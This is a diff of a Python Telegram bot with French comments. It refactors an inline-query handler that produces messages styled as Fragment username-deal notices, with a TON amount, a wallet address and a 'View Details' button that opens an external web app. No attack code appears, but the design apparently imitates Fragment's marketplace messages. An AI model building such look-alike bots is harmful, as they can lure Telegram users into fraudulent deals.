@@ -107,17 +107,15 @@ Important:
         entities.append(wallet_entity)
         print(f"🔗 Wallet entity: position {wallet_start}, longueur {len(wallet_address)}")
     
-    # 📱 BOUTON HYBRIDE - Fonctionne partout
-    # Utilise switch_inline_query pour déclencher une webapp en privé
-    webapp_query = f"webapp {username} {price:g}"
+    # 📱 BOUTON UNIQUE - switch_inline_query pour fonctionner partout
     keyboard = InlineKeyboardMarkup([[
         InlineKeyboardButton(
             "View Details", 
-            switch_inline_query=webapp_query
+            switch_inline_query=f"webapp {username} {price:g}"
         )
     ]])
     
-    print(f"🔗 Bouton hybride créé avec query: {webapp_query}")
+    print(f"🔗 Bouton View Details configuré pour webapp {username} {price:g}")
     
     return fragment_message, entities, keyboard
 
@@ -133,28 +131,31 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
             await update.inline_query.answer([], cache_time=0)
             return
         
-        # Parsing de la requête
         parts = query.split()
         
-        # CAS SPÉCIAL : Requête webapp (déclenchée par le bouton)
-        if parts[0] == "webapp" and len(parts) >= 3:
-            username = parts[1]
+        # 🎯 GESTION DE LA REQUÊTE WEBAPP (déclenchée par le bouton "View Details")
+        if len(parts) >= 3 and parts[0] == "webapp":
+            username = parts[1].replace('@', '')
             try:
                 ton_amount = float(parts[2])
-            except:
+                if ton_amount <= 0:
+                    raise ValueError("Montant doit être positif")
+            except ValueError:
                 await update.inline_query.answer([], cache_time=0)
                 return
             
-            # Génération du résultat avec WebApp intégrée
+            # Génération de la WebApp avec l'URL exacte de votre fichier original
             webapp_url = f"{WEBAPP_URL}?user={username}&price={ton_amount:g}"
+            current_ton_price = get_ton_price()
+            current_usd_value = ton_amount * current_ton_price
             
             results = [
                 InlineQueryResultArticle(
                     id=f"webapp_{username}_{ton_amount}_{int(time.time())}",
-                    title=f"📱 View Details - @{username}",
-                    description=f"💎 {ton_amount:g} TON - Open Web App",
+                    title=f"📱 Fragment Details: @{username}",
+                    description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
                     input_message_content=InputTextMessageContent(
-                        f"🔍 Loading details for @{username} deal...\n💎 Amount: {ton_amount:g} TON",
+                        f"🔍 Opening Fragment details for @{username}...\n💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
                         disable_web_page_preview=True
                     ),
                     reply_markup=InlineKeyboardMarkup([[
@@ -166,10 +167,10 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
                 )
             ]
             
-            await update.inline_query.answer(results, cache_time=0)
+            await update.inline_query.answer(results, cache_time=0, is_personal=False)
             return
         
-        # CAS NORMAL : Génération de message Fragment (username montant)
+        # 🎯 GESTION NORMALE (username montant) - Message Fragment complet
         if len(parts) < 2:
             await update.inline_query.answer([], cache_time=0)
             return
@@ -184,7 +185,7 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
             await update.inline_query.answer([], cache_time=0)
             return
         
-        # Génération du message Fragment
+        # Génération du message Fragment avec le bouton unique
         fragment_message, entities, keyboard = generate_fragment_message(username, ton_amount)
         
         # Prix pour affichage
@@ -201,7 +202,7 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
                     entities=entities,
                     disable_web_page_preview=True
                 ),
-                reply_markup=keyboard
+                reply_markup=keyboard  # Bouton unique avec switch_inline_query
             )
         ]
         
@@ -255,7 +256,7 @@ class WebhookHandler(BaseHTTPRequestHandler):
         self.send_header('Content-Type', 'text/plain')
         self.end_headers()
         
-        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n📱 Web App: {WEBAPP_URL}"
+        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n📱 Web App (Intégrée): {WEBAPP_URL}"
         self.wfile.write(status.encode('utf-8'))
     
     def log_message(self, format, *args):
